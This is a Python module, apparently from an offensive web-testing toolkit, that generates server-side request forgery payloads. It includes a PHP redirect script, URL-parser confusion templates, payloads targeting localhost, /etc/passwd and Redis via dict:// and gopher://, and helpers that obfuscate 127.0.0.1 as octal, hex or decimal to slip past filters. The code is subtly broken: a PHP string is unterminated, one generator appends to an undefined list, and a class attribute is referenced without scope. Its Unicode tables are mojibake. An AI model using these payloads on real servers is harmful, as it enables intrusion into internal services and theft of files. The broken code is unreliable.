#!/usr/bin/env python
# -*- coding: utf-8 -*-

from functools import reduce
from saker.fuzzers.fuzzer import Fuzzer

_server = '''
<?php
$scheme = $_GET['s']    ?? 'http';
$ip     = $_GET['ip']   ?? '127.0.0.1';
$port   = $_GET['port'] ?? '80';
$path   = $_GET['path'] ?? '';
$code   = $_GET['code]  ?? 'HTTP/1.1 302 Found';
header($code);
header("Location: $scheme://$ip:$port/$path");
'''


class SSRF(Fuzzer):

    """Server-Side Request Forgery"""

    Unicode = {
        '0': ['â“ª', 'ï¼', 'ðŸŽ', 'ðŸ˜', 'ðŸ¢', 'ðŸ¬', 'ðŸ¶', 'â°', 'â‚€'],
        '1': ['â‘ ', 'ï¼‘', 'ðŸ', 'ðŸ™', 'ðŸ£', 'ðŸ­', 'ðŸ·', 'Â¹', 'â‚'],
        '2': ['â‘¡', 'ï¼’', 'ðŸ', 'ðŸš', 'ðŸ¤', 'ðŸ®', 'ðŸ¸', 'Â²', 'â‚‚'],
        '3': ['â‘¢', 'ï¼“', 'ðŸ‘', 'ðŸ›', 'ðŸ¥', 'ðŸ¯', 'ðŸ¹', 'Â³', 'â‚ƒ'],
        '4': ['â‘£', 'ï¼”', 'ðŸ’', 'ðŸœ', 'ðŸ¦', 'ðŸ°', 'ðŸº', 'â´', 'â‚„'],
        '5': ['â‘¤', 'ï¼•', 'ðŸ“', 'ðŸ', 'ðŸ§', 'ðŸ±', 'ðŸ»', 'âµ', 'â‚…'],
        '6': ['â‘¥', 'ï¼–', 'ðŸ”', 'ðŸž', 'ðŸ¨', 'ðŸ²', 'ðŸ¼', 'â¶', 'â‚†'],
        '7': ['â‘¦', 'ï¼—', 'ðŸ•', 'ðŸŸ', 'ðŸ©', 'ðŸ³', 'ðŸ½', 'â·', 'â‚‡'],
        '8': ['â‘§', 'ï¼˜', 'ðŸ–', 'ðŸ ', 'ðŸª', 'ðŸ´', 'ðŸ¾', 'â¸', 'â‚ˆ'],
        '9': ['â‘¨', 'ï¼™', 'ðŸ—', 'ðŸ¡', 'ðŸ«', 'ðŸµ', 'ðŸ¿', 'â¹', 'â‚‰'],
        '10': ['â‘©'],
        '11': ['â‘ª'],
        '12': ['â‘«'],
        '13': ['â‘¬'],
        '14': ['â‘­'],
        '15': ['â‘®'],
        '16': ['â‘¯'],
        '17': ['â‘°'],
        '18': ['â‘±'],
        '19': ['â‘²'],
        '20': ['â‘³'],
        '.': ['ã€‚', 'ï½¡', 'ï¼Ž'],
        'a': ['ï½', 'ðš', 'ð‘Ž', 'ð’‚', 'ð’¶', 'ð“ª', 'ð”ž', 'ð•’', 'ð–†', 'ð–º', 'ð—®', 'ð˜¢', 'ð™–', 'ðšŠ', 'â“', 'ï¼¡', 'ð€', 'ð´', 'ð‘¨', 'ð’œ', 'ð“', 'ð”„', 'ð”¸', 'ð•¬', 'ð– ', 'ð—”', 'ð˜ˆ', 'ð˜¼', 'ð™°', 'â’¶', 'Âª', 'áµƒ', 'â‚', 'á´¬', 'ðŸ„°'],
        'b': ['ï½‚', 'ð›', 'ð‘', 'ð’ƒ', 'ð’·', 'ð“«', 'ð”Ÿ', 'ð•“', 'ð–‡', 'ð–»', 'ð—¯', 'ð˜£', 'ð™—', 'ðš‹', 'â“‘', 'ï¼¢', 'â„¬', 'ð', 'ðµ', 'ð‘©', 'ð“‘', 'ð”…', 'ð”¹', 'ð•­', 'ð–¡', 'ð—•', 'ð˜‰', 'ð˜½', 'ð™±', 'â’·', 'áµ‡', 'á´®', 'ðŸ„±'],
        'c': ['ï½ƒ', 'â…½', 'ðœ', 'ð‘', 'ð’„', 'ð’¸', 'ð“¬', 'ð” ', 'ð•”', 'ð–ˆ', 'ð–¼', 'ð—°', 'ð˜¤', 'ð™˜', 'ðšŒ', 'â“’', 'ï¼£', 'â…­', 'â„‚', 'â„­', 'ð‚', 'ð¶', 'ð‘ª', 'ð’ž', 'ð“’', 'ð•®', 'ð–¢', 'ð—–', 'ð˜Š', 'ð˜¾', 'ð™²', 'â’¸', 'ðŸ„«', 'á¶œ', 'ðŸ„²'],
        'd': ['ï½„', 'â…¾', 'â…†', 'ð', 'ð‘‘', 'ð’…', 'ð’¹', 'ð“­', 'ð”¡', 'ð••', 'ð–‰', 'ð–½', 'ð—±', 'ð˜¥', 'ð™™', 'ðš', 'â““', 'ï¼¤', 'â…®', 'â……', 'ðƒ', 'ð·', 'ð‘«', 'ð’Ÿ', 'ð““', 'ð”‡', 'ð”»', 'ð•¯', 'ð–£', 'ð——', 'ð˜‹', 'ð˜¿', 'ð™³', 'â’¹', 'áµˆ', 'á´°', 'ðŸ„³'],
        'e': ['ï½…', 'â„¯', 'â…‡', 'ðž', 'ð‘’', 'ð’†', 'ð“®', 'ð”¢', 'ð•–', 'ð–Š', 'ð–¾', 'ð—²', 'ð˜¦', 'ð™š', 'ðšŽ', 'â“”', 'ï¼¥', 'â„°', 'ð„', 'ð¸', 'ð‘¬', 'ð“”', 'ð”ˆ', 'ð”¼', 'ð•°', 'ð–¤', 'ð—˜', 'ð˜Œ', 'ð™€', 'ð™´', 'â’º', 'áµ‰', 'â‚‘', 'á´±', 'ðŸ„´'],
        'f': ['ï½†', 'ðŸ', 'ð‘“', 'ð’‡', 'ð’»', 'ð“¯', 'ð”£', 'ð•—', 'ð–‹', 'ð–¿', 'ð—³', 'ð˜§', 'ð™›', 'ðš', 'â“•', 'ï¼¦', 'â„±', 'ð…', 'ð¹', 'ð‘­', 'ð“•', 'ð”‰', 'ð”½', 'ð•±', 'ð–¥', 'ð—™', 'ð˜', 'ð™', 'ð™µ', 'â’»', 'á¶ ', 'ðŸ„µ'],
        'x': ['ï½˜', 'â…¹', 'ð±', 'ð‘¥', 'ð’™', 'ð“', 'ð”', 'ð”µ', 'ð•©', 'ð–', 'ð—‘', 'ð˜…', 'ð˜¹', 'ð™­', 'ðš¡', 'â“§', 'ï¼¸', 'â…©', 'ð—', 'ð‘‹', 'ð‘¿', 'ð’³', 'ð“§', 'ð”›', 'ð•', 'ð–ƒ', 'ð–·', 'ð—«', 'ð˜Ÿ', 'ð™“', 'ðš‡', 'â“', 'Ë£', 'â‚“', 'ðŸ…‡'],
    }

    modes = [
        "http://<fake>&@<real>",
        "http://<real>&@<fake>",
        "http://<fake># @<real>",
        "http://<real># @<fake>",
        "http://<fake>#@<real>",
        "http://<real>#@<fake>",
        "http://foo@<real>:80@<fake>",
    ]

    def __init__(self):
        super(SSRF, self).__init__()

    @staticmethod
    def testlocal():
        payload = ["http://127.0.0.1"]
        payload += ["http://localhost"]
        payload += ["http://sudo.cc"]  # 127.0.0.1
        payload += ["http://127.0.0.1.xip.io"]
        for p in payload:
            yield p

    @staticmethod
    def testproto():
        payload += ["file:///etc/passwd"]
        payload += ["dict://127.0.0.1:6379/info"]
        payload += ["gopher://127.0.0.1"]
        payload += ["ftp://user:pwd@127.0.0.1"]
        for p in payload:
            yield p

    @staticmethod
    def bypass(real, fake="google.com"):
        for m in modes:
            yield m.replace("<real>", real).replace("<fake>", fake)

    @staticmethod
    def ip2oct(ip):
        '''
        >>> SSRF.ip2oct("127.0.0.1")
        '0o177.0o0.0o0.0o1'
        '''
        return ".".join(map(lambda i: oct(int(i)), ip.split(".")))

    @staticmethod
    def ip2hex(ip):
        '''
        >>> SSRF.ip2hex("127.0.0.1")
        '0x7f.0x0.0x0.0x1'
        '''
        return ".".join(map(lambda i: hex(int(i)), ip.split(".")))

    @staticmethod
    def ip2dec(ip):
        '''
        >>> SSRF.ip2dec("127.0.0.1")
        '2130706433'
        '''
        return str(reduce(lambda x, y: (x << 8) + y, map(int, ip.split(".")))).strip("L")

    @staticmethod
    def ip2hexI(ip):
        '''
        >>> SSRF.ip2hexI("127.0.0.1")
        '0x7f000001'
        '''
        return hex(reduce(lambda x, y: (x << 8) + y, map(int, ip.split(".")))).strip("L")
